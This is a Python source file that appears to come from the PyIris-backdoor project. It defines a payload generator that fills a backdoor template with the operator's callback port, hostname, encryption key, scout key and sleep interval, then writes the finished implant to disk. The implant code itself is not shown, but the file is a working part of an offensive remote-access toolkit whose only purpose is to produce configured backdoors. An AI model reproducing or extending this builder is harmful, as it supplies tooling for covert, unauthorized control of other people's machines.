import os
import cfg

cfg.global_variables()

def generate_payload(payload,configs,generate_to):
    try:
        move_back_to = os.getcwd()
        os.chdir(cfg.payload_templates_dir)
        f = open(payload,'r')
        data = f.read()
        f.close()
        data = data.replace('!!!!!',str(configs['Port'][0]),1)
        data = data.replace('@@@@@',"'" + configs['Hostname'][0] + "'",1)
        data = data.replace('#####',"'" + configs['Key'][0] + "'",1)
        data = data.replace('$$$$$', "'" + cfg.End + "'", 1)
        data = data.replace('%%%%%', "'" + cfg.scout_key + "'", 1)
        data = data.replace('^^^^^', configs['SleepTime'][0], 1)
        if not generate_to:
            if os.path.isdir(os.path.join(cfg.current_folder, 'generated')):
                pass
            else:
                os.mkdir(os.path.join(cfg.current_folder, 'generated'))
            os.chdir(os.path.join(cfg.current_folder , 'generated'))
            f = open(payload, 'w')
            f.write(data)
            f.close()
            print cfg.pos + 'Generated payload to default sub-folder in PyIris-backdoor : generated'
            os.chdir(move_back_to)
        else:
            if os.path.isdir(generate_to):
                os.chdir(generate_to)
                f = open(payload,'w')
                f.write(data)
                f.close()
                print cfg.pos + 'Generated payload to folder : ' + generate_to
                os.chdir(move_back_to)
            else:
                print cfg.err + 'Folder does not exist, aborting payload generation...'
                os.chdir(move_back_to)
    except (WindowsError,OSError) as e:
        print cfg.err + 'Error generating payload : ' + str(e)